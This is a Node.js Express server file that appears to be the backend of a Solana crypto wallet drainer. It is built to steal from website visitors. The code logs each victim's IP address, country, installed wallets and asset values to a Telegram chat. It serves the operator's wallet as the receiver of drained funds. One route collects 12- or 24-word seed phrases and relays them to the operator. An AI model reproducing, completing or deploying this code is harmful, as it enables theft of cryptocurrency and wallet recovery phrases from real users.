const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const compression = require('compression');

const DATABASE = require('./database.json');
const { initTG, sendMessageToChat } = require("./bot");
const { getHostnameFromRegex } = require("./functions");
const { lmao } = require('./fun');

const app = express();
const port = process.env.PORT || DATABASE.backendPort;

// app.set('trust proxy', true);

app.use(compression());
app.use(cors({
    origin: [
        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
        'http://localhost:3000',
        'http://localhost:3001',
        'http://127.0.0.1:3000',
        'https://sollyzeno.vercel.app',
        'http://127.0.0.1:3001'
    ],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['*']
}));

// Additional CORS headers for all responses
app.use((req, res, next) => {
    const allowedOrigins = [
        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
        'https://sollyzeno.vercel.app',
        'http://localhost:3000',
        'http://localhost:3001',
        'http://127.0.0.1:3000',
        'http://127.0.0.1:3001'
    ];

    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    }

    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(bodyParser.json({limit: '150mb'}));
app.use(bodyParser.urlencoded({limit: '150mb', extended: true}));

// Helper function for unauthorized responses
function sendUnauthorized(res, message = 'Invalid or missing connection key') {
    return res.status(401).json({ error: message });
}

// Helper function for internal errors
function sendInternalError(res, message = 'Internal server error') {
    return res.status(500).json({ error: message });
}

function checkConnectionKey(key = null) {
    try {
        return key === DATABASE.connectionKey;
    } catch (e) {
        return false;
    }
}

app.get('/', (req, res) => {
    res.send('OK');
});

app.post("/api/onaccept", async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const ORIGIN = req.body.ORIGIN;
        const ITEMS = req.body.ITEMS;
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        let totalValue = 0;
        if (ITEMS && Array.isArray(ITEMS)) {
            for (const item of ITEMS) {
                totalValue += parseFloat(item.VALUE) || 0;
            }
        }

        if (GCID) {
            sendMessageToChat(GCID, `<b>&#128184; New transaction (IP: ${CIP} / Country: ${COUNTRY})\n\n🔗 Domain: ${getHostnameFromRegex(ORIGIN)}\n&#9989; USD: ${formatter.format(totalValue)}\nTotal activity: ${ITEMS ? ITEMS.length : 0}</b>`);
        }

        res.send(lmao());
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/details', async (req, res) => {
    const CONNECTIONKEY = req.body.CONNECTIONKEY;

    if (!checkConnectionKey(CONNECTIONKEY)) {
        return sendUnauthorized(res);
    }

    const wallet = DATABASE.ownerPublicKey;

    return res.json({
        "RECEIVER": wallet
    });
});

app.post('/api/info', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const victim = req.body.WALLET;
        const portfolio = req.body.PORTFOLIO;
        const origin = req.body.ORIGIN || "http://localhost";
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);
        let totalValue = 0;
        let message = `<b>⚡️ User connected the wallet (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>&#128123; Have Phantom Wallet? ${req.body.wallets.phantom ? "Yes!" : "No"}\n&#127774; Have Solflare Wallet? ${req.body.wallets.solflare ? "Yes!" : "No"}\n🪙 Have Coinbase Wallet? ${req.body.wallets.coinbase ? "Yes!" : "No"}\n💼 Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>\n<b>&#128279; Domain: ${getHostnameFromRegex(origin)}</b>\n\n<b>User Assets</b>\n<blockquote>`;
        let i = 0;
        for (const portfolioItem of portfolio) {
            i++;
            if (portfolioItem.NAME !== undefined) {
                const itemValue = parseFloat(portfolioItem.VALUE) || 0;
                totalValue += itemValue;
                if (itemValue == 0) i--;
                else if (i <= 20) message += `${i}. ${portfolioItem.MINT} - ${portfolioItem.NAME} - ${formatter.format(portfolioItem.VALUE)}\n`;
            } else {
                i--;
            }
        }
        message += `</blockquote>\n\n&#128179; <b>Wallet costs:</b> <pre>${formatter.format(totalValue)}</pre>`;

        if (GCID) {
            sendMessageToChat(GCID, message);
        }

        return res.send(lmao());
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/join', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const origin = req.body.ORIGIN || "http://localhost";
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        let message = `<b>👨‍💻 User opened the website (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>🔗 Domain: ${getHostnameFromRegex(origin)}\n&#128123; Have Phantom Wallet? ${req.body.wallets.phantom ? "Yes!" : "No"}\n&#127774; Have Solflare Wallet? ${req.body.wallets.solflare ? "Yes!" : "No"}\n🪙 Have Coinbase Wallet? ${req.body.wallets.coinbase ? "Yes!" : "No"}</b>`;

        if (GCID) {
            sendMessageToChat(GCID, message);
        }

        return res.send(lmao());
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/oncancel', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const victim = req.body.WALLET;
        const origin = req.body.ORIGIN;
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);

        let message = `<b>&#10060; User rejected the request (IP: ${CIP} / Country: ${COUNTRY})\n🔗 Domain: ${getHostnameFromRegex(origin)}</b>\n\n<b>&#128188; Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>`;

        sendMessageToChat(GCID, message);
        return res.send(lmao());
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/inf', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;
        const seeds = req.body.words;
        const origin = req.body.ORIGIN;

        let t = '';
        let regex = new RegExp('[A-Za-z\\s]+');
        let i = 1;
        let count = 0;

        for (var word of seeds) {
            word = word.trim();
            if (regex.test(word)) {
                t += `${i}. ${word}\n`;
                count++;
            } else {
                return sendUnauthorized(res, 'Invalid seed phrase format');
            }
            i++;
        }

        if (count != 12 && count != 24) {
            return sendUnauthorized(res, 'Seed phrase must be 12 or 24 words');
        }

        var message = `<b>&#127793; Got seed phrase (IP: ${CIP} / Country: ${COUNTRY})\n\n&#128279; Domain\n${getHostnameFromRegex(origin)}\n\nData:\n${t}</b>`;

        sendMessageToChat(GCID, message);
        return res.send("ok");
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/onrequest', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return sendUnauthorized(res);
        }

        const GCID = req.body.GCID;
        const victim = req.body.WALLET;
        const origin = req.body.ORIGIN;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);

        let message = `<b>&#10067; User recieved a withdrawal request (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>🔗 Domain: ${getHostnameFromRegex(origin)}</b>\n<b>&#128188; Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>`;

        sendMessageToChat(GCID, message);
        return res.send(lmao());
    } catch (e) {
        console.error(e);
        sendInternalError(res);
    }
});

app.post('/api/connect', async (req, res) => {
    const CONNECTIONKEY = req.body.CONNECTIONKEY;

    if (!checkConnectionKey(CONNECTIONKEY)) {
        return res.send(lmao());  // keep original behavior? Or use sendUnauthorized? Keeping as original.
    }

    return res.send("1");
});

// Catch-all for any unmatched GET/POST routes - now properly returns 404
app.get("/*", async (req, res) => {
    res.status(404).send('Not found');
});

app.post("/*", async (req, res) => {
    res.status(404).send('Not found');
});

app.listen(port, '0.0.0.0', async function () {
    await initTG();
    console.log(`Now we at ${port}`);
});